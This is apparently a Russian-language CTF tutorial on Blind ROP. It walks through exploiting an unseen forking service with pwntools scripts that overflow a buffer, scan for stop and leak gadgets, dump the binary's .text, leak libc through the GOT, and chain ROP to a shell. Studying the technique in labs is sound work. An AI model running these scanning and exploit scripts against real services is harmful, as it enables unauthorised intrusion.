## Вопрос, с которого всё начинается

Дан сетевой сервис на `nc host 1337`. Бинаря нет — ни файла, ни libc, ни исходников. Есть только переполнение буфера, которое роняет сервис. Как вообще эксплуатировать то, что ты не видишь?

Оказывается, можно: сервис сам расскажет о себе, если наблюдать за его поведением. Падает он или нет, печатает что-то или молчит — каждый ответ это сигнал. Техника называется **BROP** — Blind ROP, «слепой ROP».

## Наш пример: сервис, который форкает

```text
$ nc host 1337
Welcome!
```

Сервис читает строку в буфер и падает при переполнении. Ключевой вопрос: перезапускается ли он? Проверим — отправим мусор и снова подключимся:

```text
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" | nc host 1337
$ nc host 1337
Welcome!
```

Сервис снова отвечает. Значит, он **форкает** — на каждое соединение порождает дочерний процесс. Это критично: при `fork` адреса ASLR в родителе не меняются, поэтому падения детей не сбивают адресную раскладку. Именно это делает BROP возможным.

## Шаг 1. Первая задача: найти «безопасный» адрес

Мы переполняем буфер и попадаем адресом возврата в какое-то место. Прыжок в случайное место роняет сервис. Но если найти адрес, прыжок на который **не** роняет сервис, — получим надёжную точку опоры.

Такой адрес называют **stop-gadget**. Обычно это просто инструкция `ret` где-то в конце функции: она снимает со стека следующее слово и прыгает дальше, ничего не ломая. Ищем в диапазоне `.text` без PIE — от `0x400000`:

```python
from pwn import *

def probe(addr, payload_extra=b''):
    try:
        p = remote('host', 1337)
        p.recvuntil(b'Welcome!\n')
        p.send(b'A'*72 + p64(addr) + payload_extra)
        data = p.recv(timeout=1)
        p.close()
        return data
    except EOFError:
        return None   # сервис упал

# сканируем первые 0x1000 байт .text
stop = None
for addr in range(0x400000, 0x401000, 8):
    if probe(addr) is not None:
        stop = addr
        break
log.success(f'stop-gadget @ {hex(stop)}')
```

```text
[+] stop-gadget @ 0x4006c0
```

Адрес найден. Теперь у нас есть «якорь»: прыжок на него не убивает сервис, и можно строить эксперименты дальше.

## Шаг 2. Ищем утечку памяти

Следующая цель — гаджет, который **печатает** память. Классика — вызов `write(1, addr, len)` или `puts(addr)`. Ищем так: кладём в цепочку проверяемый адрес, а сразу за ним — наш `stop-gadget` (чтобы после вызова сервис остался жив), и смотрим, появились ли в ответе байты.

```python
for addr in range(0x400000, 0x401000, 8):
    out = probe(addr, p64(stop) + p64(0x400000))  # кандидат + аргумент
    if out and len(out) > 0 and b'Welcome' not in out:
        log.success(f'BROP-gadget @ {hex(addr)}, leak = {out.hex()}')
        break
```

```text
[+] BROP-gadget @ 0x4007a2, leak = 7f454c46020101000000...
```

Байты `7f 45 4c 46` — это магия ELF (`\x7fELF`). Мы утекли начало `.text` бинаря! Теперь у нас есть кусок его кода, которого у нас не было.

## Шаг 3. Восстанавливаем бинарь

С найденным leak-гаджетом можно **дампнуть** `.text` постранично: подаём на вход адрес и длину, читаем ответ. Так восстанавливается код, а в нём — адреса PLT-заглушек:

```python
def dump(addr, n):
    out = probe(leak_gadget, p64(stop) + p64(addr) + p64(n))
    return out or b''

text = b''.join(dump(0x400000 + i, 0x100) for i in range(0, 0x2000, 0x100))
open('recovered.bin', 'wb').write(text)
```

Восстановленный фрагмент можно дизассемблировать и найти `write@plt`/`puts@plt` — по характерным байтам трамплинов.

## Шаг 4. От `.text` к libc

Имея `write@plt` и `write@got`, делаем обычную утечку: вызываем `write(1, write@got, 8)` через наш leak-гаджет и читаем адрес `write` в libc. Дальше — как в `pwn-ret2libc`: вычитаем оффсет, получаем базу.

```python
leak = dump(got_write, 8)
libc.address = u64(leak.ljust(8, b'\x00')) - libc.symbols['write']
log.success(f'libc @ {hex(libc.address)}')
```

Теперь, зная базу libc, можно строить обычный ROP — а значит, получить shell.

## Шаг 5. Полный конвейер

```text
1) Подтвердить, что сервис форкает (падение -> снова отвечает).
2) Найти stop-gadget: сканировать .text, искать непадающий адрес.
3) Найти BROP-gadget: сканировать, искать вывод памяти.
4) Дампнуть .text и найти write@plt / got.
5) Утечь GOT -> база libc.
6) Собрать ROP -> shell.
```

## Какой сигнал считается наблюдаемым

BROP держится на том, что сервис различимо реагирует. Минимальный набор сигналов:

| Реакция | Что означает |
|---|---|
| соединение сразу закрылось | сервис упал — адрес неверный |
| сервис ответил «Welcome» | прыжок безопасен (stop-gadget) |
| пришли «лишние» байты | сработала утечка (BROP-gadget) |
| таймаут | неоднозначно: возможно, сервис завис на `read` |

Если сервис молчит и не падает — это плохой сигнал: непонятно, сработало ли. Тогда в цепочку добавляют `stop-gadget`, чтобы гарантированно получить ответ. Важно, чтобы признак был **бинарным** и повторяемым: BROP сканирует тысячи адресов, и один шумный сигнал ломает весь конвейер.

## Инструменты и автоматизация

Вручную перебрать тысячи адресов нереально — BROP обязательно автоматизируется. Основа — функция `probe`, которая подключается, отправляет payload, читает ответ и **классифицирует** его в одну из трёх категорий:

- **crash** — соединение оборвалось сразу, сервис упал: адрес неверный;
- **no-crash** — сервис ответил или промолчал, но не упал: кандидат в stop-gadget;
- **output** — пришли байты данных: кандидат в leak-gadget.

Дальше — циклы по диапазону адресов: сначала ищем no-crash (stop), затем output (leak). Для ускорения сканируй с шагом 8 (выравнивание инструкций), кэшируй уже проверенные адреса, поднимай несколько соединений параллельно. Дамп `.text` делай блоками по 0x100–0x1000 байт и складывай в файл — так восстанавливается образ, который потом открывается в дизассемблере. Логируй каждый шаг: при тысячах запросов без логов легко потеряться. Оригинальная работа — «Hacking Blind» (Bittau et al., 2014); в ней описан весь конвейер и его ограничения.

## На что смотреть дальше

- **Сервис не форкает?** Тогда ASLR меняет адреса между соединениями — BROP невозможен, ищи утечку другим способом.
- **PIE?** Диапазон адресов огромен, слепое сканирование непрактично. Нужна хотя бы частичная утечка.
- **Есть seccomp?** Переключайся на ORW-путь (open/read/write).
- **Слишком медленно?** Сканируй с шагом, кэшируй ответы, открывай несколько соединений параллельно.
- **BROP — техника «последней мили».** Если появилась любая утечка, дальше идёт обычный ROP.

## Что мы теперь знаем

- BROP строит цепочку вслепую, наблюдая ответы сервиса.
- Обязательное условие — форкающий сервис и наблюдаемые падения.
- Stop-gadget даёт «безопасный» адрес; BROP-gadget утекает память.
- С утечкой `.text` восстанавливаются PLT/GOT, затем libc.
- BROP плохо совместим с PIE и требует автоматизации.

## Куда дальше

На этом ветка «экзотического ROP» заканчивается. Дальше логичный шаг — `pwn-ret2libc`: мы уже умеем утекать libc вслепую, а в следующем уроке доведём утечку до `system("/bin/sh")` в обычных, видимых бинарях. А пока главное: **даже без бинаря поведение сервиса (падает / не падает / печатает) позволяет восстановить его код и построить эксплойт.**
